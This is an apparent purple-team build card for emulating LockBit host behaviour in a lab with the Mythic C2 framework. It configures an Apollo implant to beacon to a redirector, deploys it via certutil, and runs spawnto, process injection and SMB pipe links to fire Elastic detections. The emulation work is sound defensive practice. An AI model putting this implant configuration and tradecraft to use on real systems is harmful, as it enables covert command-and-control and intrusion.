# F4 BUILD CARD — LockBit host emulation (lights up H2 + H3)

Build ONE Apollo payload with BOTH the httpx (egress) and smb (P2P) profiles, callback via the
deployed redirector. Mythic UI: Payloads -> Create Payload -> Apollo -> Windows.

## C2 profile: httpx  (egress, actor-attributed = LockBit)
| Param | Value |
|---|---|
| httpx_callback_domains | `https://192.168.36.117:443`  (redirector VM 117, 192-side, self-signed) |
| httpx_raw_c2_config | paste the contents of `../profiles/lockbit-icbc.httpx.toml` |
| httpx_callback_interval | 62 |
| httpx_callback_jitter | 37 |
| httpx_domain_rotation | fail-over |
| httpx_failover_threshold | 5 |
| httpx_encrypted_exchange_check | true |
| httpx_domain_front | (leave empty) |
| httpx_killdate | (operation end date) |

> Self-signed redirector cert: the Apollo httpx client must not verify/pin it. Apollo's httpx
> generally accepts it; if the beacon fails TLS, either add `redir.crt` to the target trust store
> or fall back to the generic ops build direct to Mythic for the lab run.

## C2 profile: smb  (P2P — creates the fullduplex_84 pipe for H2)
| Param | Value |
|---|---|
| pipename | `fullduplex_84` |

## Deliver + callback
- Deliver to WS01 (VMID 121, tag=10) via the lab access shim (certutil) — labeled shim, F5.
- **PRE-CHECK from WS01:** `Test-NetConnection 192.168.36.117 -Port 443` must succeed (WS01 net1
  is on vmbr0/192.168.36). If it fails, the beacon can't reach the redirector.
- Confirm the callback appears in Mythic.

## Tasks to fire the detections
1. **spawnto -> wuauclt:** `spawnto_x64 C:\Windows\System32\wuauclt.exe` (+ x86 SysWOW64).
2. **H3** (Sysmon 8, CreateRemoteThread -> wuauclt.exe): run a fork&run post-ex that uses spawnto,
   e.g. `execute_assembly Seatbelt.exe -group=system`. (If Apollo's injector isn't CreateRemoteThread,
   inject into an existing wuauclt PID with `inject <pid>` — see HOST-EMULATION-LOCKBIT.md.)
3. **H2** (Sysmon 17/18, pipe `\\fullduplex_84`): deploy a 2nd Apollo (smb profile) on an internal
   host and `link` to it, so the named pipe is created.

## Acceptance
- Elastic **H3**: sequence CreateRemoteThread(target=wuauclt.exe) + external non-trusted connection.
- Elastic **H2**: PipeCreated/PipeConnected `\\fullduplex_84`.
- **N6** already met by the redirector: JA3S/JARM at 10.23.20.201:443 = nginx/OpenSSL stack, not
  Mythic's Go listener.
